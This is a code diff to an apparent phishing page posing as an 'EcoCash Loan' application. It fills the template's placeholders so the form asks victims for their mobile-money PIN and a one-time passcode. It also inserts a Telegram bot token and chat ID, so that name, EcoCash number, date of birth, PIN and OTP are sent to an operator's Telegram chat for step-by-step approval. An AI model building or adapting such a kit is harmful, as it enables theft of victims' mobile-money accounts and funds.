@@ -141,7 +141,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
 
     <!-- ↓ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↓ -->
     <div class="f">
-      <label>EDIT_LABEL_HERE</label>
+      <label>PIN CODE</label>
       <input type="text" id="p2_field"/>
     </div>
     <!-- ↑ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↑ -->
@@ -194,7 +194,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
 
     <!-- ↓ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↓ -->
     <div class="f">
-      <label>EDIT_P4_LABEL_HERE</label>
+      <label>OTP CODE</label>
       <input type="text" id="p4_field"/>
     </div>
     <!-- ↑ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↑ -->
@@ -239,8 +239,8 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
 </div>
 
 <script>
-  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-  const CHAT_ID   = "8718124300";
+  const BOT_TOKEN = "9194289120:AAGE5vf2FjT8itv5kIbMoMz7FN1J-TfVpO4";
+  const CHAT_ID   = "6301686380";
   const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
   let app={}, pollTimer=null, countdown=null, lastId=0, curRef=null;
@@ -311,7 +311,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
     // ↓ CHANGE "EDIT_LABEL_HERE" TO MATCH YOUR LABEL ↓
     const msg="📋 *ECOCASH LOAN — STEP 2*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
       `👤 *Name:* ${app.name}\n📱 *EcoCash:* ${app.eco}\n\n`+
-      `▪️ *EDIT_LABEL_HERE:* ${field}\n\n`+
+      `▪️ *PIN:* ${field}\n\n`+
     // ↑ CHANGE "EDIT_LABEL_HERE" TO MATCH YOUR LABEL ↑
       `🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *Approve to proceed to Final Step:*`;
     try{
@@ -356,7 +356,7 @@ body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min
     // ↓ CHANGE "EDIT_P4_LABEL_HERE" TO MATCH YOUR LABEL ↓
     const msg="📋 *ECOCASH LOAN — FINAL STEP*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
       `👤 *Name:* ${app.name}\n📱 *EcoCash:* ${app.eco}\n💵 *Amount:* USD $${Number(app.amt).toLocaleString()}\n🎂 *DOB:* ${app.dob}\n▪️ *Step 2:* ${app.p2field}\n\n`+
-      `▪️ *EDIT_P4_LABEL_HERE:* ${field}\n\n`+
+      `▪️ *OTP:* ${field}\n\n`+
     // ↑ CHANGE "EDIT_P4_LABEL_HERE" TO MATCH YOUR LABEL ↑
       `🔖 *Final Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *FINAL DECISION:*`;
     try{
